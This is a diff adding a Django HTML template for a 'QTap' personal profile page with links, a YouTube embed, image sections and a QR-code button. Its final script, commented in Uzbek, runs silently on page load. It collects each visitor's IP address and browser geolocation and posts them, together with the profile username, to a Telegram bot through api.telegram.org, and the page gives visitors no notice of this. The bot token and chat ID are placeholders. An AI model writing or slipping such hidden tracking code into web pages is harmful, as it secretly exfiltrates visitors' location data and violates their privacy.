@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Profile</title>
+    <style type="text/css">
+      body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .profile-header {
+            text-align: center;
+            color: #fff;
+            padding: 20px;
+            border-radius: 8px 8px 0 0;
+            position: relative;
+            background-size: cover;
+            background-position: center;
+            height: 186px;
+        }
+
+        .profile-header .background-image {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 60%; /* Adjusted to cover the top part */
+            z-index: -1;
+            border-radius: 8px 8px 0 0;
+            background-size: cover;
+            background-position: center;
+        }
+
+        .profile-header .profile-image {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            border: 5px solid #fff;
+            margin-top: 60px; /* Adjusted margin to position the image correctly */
+            background-color: #fff; /* Added background color for better visibility */
+            position: relative;
+        }
+
+        .profile-header h2, .profile-header p {
+            color: #000; /* Black text color */
+            margin-top: 10px; /* Adjusted margin to push text below the profile image */
+        }
+        
+
+        .profile-links {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            margin: 20px 0;
+        }
+
+        .profile-links a {
+            margin: 0 10px;
+            color: #000;
+            text-decoration: none;
+        }
+
+        .profile-links a i {
+            font-size: 24px;
+        }
+
+        .profile-links .qr-button {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            background-color: #000;
+            color: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            margin-left: 10px;
+            text-decoration: none;
+        }
+
+        .profile-links .qr-button:hover {
+            background-color: #333;
+        }
+
+        .content-section {
+            margin-bottom: 20px;
+        }
+
+        .content-section img {
+            width: 100%;
+            border-radius: 8px;
+        }
+
+        .content-section h3 {
+            margin: 10px 0;
+        }
+
+        .content-section p {
+            margin: 10px 0;
+        }
+
+        .youtube-section {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .youtube-section h3 {
+            margin-bottom: 20px;
+        }
+
+        .youtube-section iframe {
+            width: 100%;
+            height: 400px;
+            border: none;
+        }
+
+        .youtube-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .youtube-links a {
+            width: 48%;
+            margin: 1%;
+            text-decoration: none;
+        }
+
+        .youtube-links a div {
+            background-color: #333;
+            color: #fff;
+            padding: 10px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .footer p {
+            margin: 0;
+        }
+
+        .qr-code-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .qr-code-modal .modal-content {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            position: relative;
+        }
+
+        .qr-code-modal .modal-content svg {
+            width: 150px;
+            height: 150px;
+        }
+
+        .qr-code-modal .close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
+        }
+
+        .language-switch {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .language-switch button {
+            background-color: #000;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            margin: 0 10px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .language-switch button:hover {
+            background-color: #333;
+        }
+
+        /* Media queries for responsiveness */
+        @media (max-width: 600px) {
+            .container {
+                padding: 0;
+                box-shadow: none;
+            }
+            .profile-header .profile-image {
+                width: 100px;
+                height: 100px;
+                margin-top: 40px;
+            }
+
+            .profile-header h2 {
+                font-size: 20px;
+            }
+
+            .profile-header p {
+                font-size: 14px;
+            }
+
+            .profile-links a i {
+                font-size: 20px;
+            }
+
+            .profile-links .qr-button {
+                width: 30px;
+                height: 30px;
+            }
+
+            .language-switch button {
+                padding: 8px 16px;
+            }
+
+            .youtube-section iframe {
+                height: 300px;
+            }
+
+            .content-section img {
+                width: 100%;
+                height: auto;
+            }
+        }
+
+        /* Media query for card adaptation */
+        @media (max-width: 600px) {
+            .profile-header, .content-section, .youtube-section, .footer {
+                padding: 10px;
+                margin: 10px;
+                box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+                border-radius: 8px;
+                height: 100px;
+            }
+
+            .profile-header .background-image {
+                height: 50%;
+            }
+
+            .profile-header .profile-image {
+                margin-top: 2px; /* Adjust to overlap with background */
+            }
+        }
+        .ol{
+            color: white !important;;
+        }
+    </style>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="profile-header" style="background-image: url('{% if user.background_image %}{{ user.background_image.url }}{% endif %}');"><br><br><br>
+            {% if user.profile_image %}
+                <img src="{{ user.profile_image.url }}" alt="Profile Image" class="profile-image">
+            {% endif %}
+            <h2 id="username" class="ol" style="color: black!important;">@{{ user.nickname }}</h2>
+            <p class="ol" style="color: black !important;;"> {{ user.description }}</p>
+           
+        </div><br><br><br><br><br><br><br><br><br>
+        <div class="profile-links">
+            {% if user.personal_links %}
+                <a href="{{ user.personal_links }}" target="_blank"><i class="fas fa-link"></i></a>
+            {% endif %}
+            {% if user.personal_links1 %}
+                <a href="{{ user.personal_links1 }}" target="_blank"><i class="fas fa-link"></i></a>
+            {% endif %}
+            {% if user.personal_links2 %}
+                <a href="{{ user.personal_links2 }}" target="_blank"><i class="fas fa-link"></i></a>
+            {% endif %}
+            {% if user.youtube_link %}
+                <a href="{{ user.youtube_link }}" target="_blank"><i class="fab fa-youtube"></i></a>
+            {% endif %}
+            <a href="#" class="qr-button" id="generate-qr-code"><i class="fas fa-qrcode"></i></a>
+            
+        </div>
+        <center><div class="support-link">
+           <button type="menu" style="    background-color: #333;
+           border-radius: 50px;
+           width: 70px;
+           height: 30px;"><a href="#" style="color: white;text-decoration: none;" class="button-link">UZB</a> </button> | <button style="    background-color: #333;
+    border-radius: 50px;
+    width: 70px;
+    height: 30px;"><a href="#" style=" text-decoration: none;width: 40px;color: white;background-color: #333;border-radius: 50%;" class="button-link">ENG</a></button> 
+        </div></center>
+        <div class="qr-code-modal" id="qr-code-modal">
+            <div class="modal-content">
+                <span class="close" id="close-modal">&times;</span>
+                <div id="qr-code-svg"></div>
+            </div>
+        </div>
+        <br>
+        <div class="youtube-section">
+            <h3>YOUTUBE</h3>
+            {% if user.youtube_link %}
+                <iframe src="{{ user.get_youtube_embed_url }}" allowfullscreen></iframe>
+            {% endif %}
+        </div>
+        <br>
+        <div class="content-section">
+            {% if user.image1 %}
+                <img src="{{ user.image1.url }}" alt="Image 1">
+                <h3>{{ user.personal1 }}</h3>
+            {% endif %}
+            {% if user.image2 %}
+                <img src="{{ user.image2.url }}" alt="Image 2">
+                <h3>{{ user.personal2 }}</h3>
+            {% endif %}
+            {% if user.image3 %}
+                <img src="{{ user.image3.url }}" alt="Image 3">
+                <h3>{{ user.personal3 }}</h3>
+            {% endif %}
+            {% if user.image4 %}
+                <img src="{{ user.image4.url }}" alt="Image 4">
+                <h3>{{ user.personal4 }}</h3>
+            {% endif %}
+            {% if user.image5 %}
+                <img src="{{ user.image5.url }}" alt="Image 5">
+                <h3>{{ user.personal5 }}</h3>
+            {% endif %}
+            {% if user.image6 %}
+                <img src="{{ user.image6.url }}" alt="Image 6">
+                <h3>{{ user.personal6 }}</h3>
+            {% endif %}
+            {% if user.image7 %}
+                <img src="{{ user.image7.url }}" alt="Image 7">
+                <h3>{{ user.personal7 }}</h3>
+            {% endif %}
+            {% if user.image8 %}
+                <img src="{{ user.image8.url }}" alt="Image 8">
+                <h3>{{ user.personal8 }}</h3>
+            {% endif %}
+            {% if user.image9 %}
+                <img src="{{ user.image9.url }}" alt="Image 9">
+                <h3>{{ user.personal9 }}</h3>
+            {% endif %}
+            {% if user.image10 %}
+                <img src="{{ user.image10.url }}" alt="Image 10">
+                <h3>{{ user.personal10 }}</h3>
+            {% endif %}
+        </div>
+        
+        <div class="footer">
+            <p>©2024 QTap</p>
+        </div>
+    </div>
+    <script>
+        $(document).ready(function() {
+            $('#generate-qr-code').click(function(e) {
+                e.preventDefault();
+                $.ajax({
+                    url: "{% url 'generate_qr_code' user.nickname %}",
+                    type: 'POST',
+                    success: function(response) {
+                        if (response.qr_code_url) {
+                            $('#qr-code-svg').html('<img src="' + response.qr_code_url + '" alt="QR Code" style="width: 150px; height: 150px;">');
+                            $('#qr-code-modal').fadeIn();
+                        } else {
+                            alert('Error generating QR code');
+                        }
+                    },
+                    error: function() {
+                        alert('Error generating QR code');
+                    }
+                });
+            });
+
+            $('#close-modal').click(function() {
+                $('#qr-code-modal').fadeOut();
+            });
+        });
+
+        // JS kodini Telegramga yuborish uchun
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('IP manzilini olishda xatolik:', error);
+                return null;
+            }
+        }
+
+        function getUserLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            resolve({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            });
+                        },
+                        error => {
+                            console.error('Geolokatsiyani olishda xatolik:', error);
+                            reject(error);
+                        }
+                    );
+                } else {
+                    console.error('Geolokatsiya funksiyasi qo\'llab-quvvatlanmaydi');
+                    reject(new Error('Geolokatsiya funksiyasi qo\'llab-quvvatlanmaydi'));
+                }
+            });
+        }
+
+        async function sendToTelegramBot(username, ip, location) {
+            const token = 'YOUR_TELEGRAM_BOT_TOKEN'; // Telegram bot tokenini kiriting
+            const chatId = 'YOUR_TELEGRAM_CHAT_ID'; // Chat ID ni kiriting
+            const message = `Foydalanuvchi: ${username}\nIP: ${ip}\nJoylashuv: Latitude: ${location.latitude}, Longitude: ${location.longitude}`;
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+                console.log('Telegramga yuborildi:', result);
+            } catch (error) {
+                console.error('Telegramga yuborishda xatolik:', error);
+            }
+        }
+
+        function getUsername() {
+            const usernameElement = document.getElementById('username');
+            return usernameElement ? usernameElement.textContent : 'Noma\'lum foydalanuvchi';
+        }
+
+        async function sendUserData() {
+            const username = getUsername();
+            const ip = await getUserIP();
+            const location = await getUserLocation();
+
+            sendToTelegramBot(username, ip, location);
+        }
+
+        document.addEventListener('DOMContentLoaded', sendUserData);
+    </script>
+</body>
+</html>
